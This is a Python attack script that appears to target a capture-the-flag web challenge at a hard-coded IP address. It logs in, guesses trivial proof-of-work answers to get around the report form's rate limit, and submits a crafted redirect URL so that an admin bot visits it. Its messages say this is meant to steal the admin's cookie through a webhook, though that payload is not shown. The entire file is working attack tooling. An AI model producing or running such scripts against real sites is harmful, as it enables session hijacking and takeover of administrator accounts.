#!/usr/bin/env python3
import requests
import re

TARGET = "http://34.26.148.28:5000"
USERNAME = "hacker1768048343"
PASSWORD = "password123"
MAGIC_URL = "http://34.26.148.28:5000/magic/8e72f63235b6a4d5aed77b3754eef891?redirect=/edit/647"

session = requests.Session()

# Login
print("[*] Logging in...")
r = session.post(f"{TARGET}/login", data={
    'username': USERNAME,
    'password': PASSWORD
})

# Get report page to extract PoW challenge
print("[*] Getting PoW challenge...")
r = session.get(f"{TARGET}/report")
pow_match = re.search(r'name="pow_challenge" value="([^"]+)"', r.text)
pow_challenge = pow_match.group(1) if pow_match else None

print(f"[*] PoW Challenge: {pow_challenge}")

# Try common simple solutions first
simple_solutions = ['s.AA==', 's.AAA=', 's.AAAA', 's.AQ==', 's.Ag==', 's.', 's.AQA=']

print("[*] Trying to submit with simple PoW solutions...")

for solution in simple_solutions:
    print(f"[*] Trying solution: {solution}")
    r = session.post(f"{TARGET}/report", data={
        'url': MAGIC_URL,
        'pow_challenge': pow_challenge,
        'pow_solution': solution
    })
    
    if 'Admin is on the way' in r.text:
        print(f"[+] SUCCESS! Admin bot triggered with solution: {solution}")
        print(f"[+] Check webhook for stolen cookie!")
        break
    elif 'Proof of work failed' in r.text:
        print(f"[-] PoW failed with {solution}")
    else:
        print(f"[-] Unknown response: {r.text[:100]}")
else:
    print("[-] All simple solutions failed. PoW might need actual solving.")

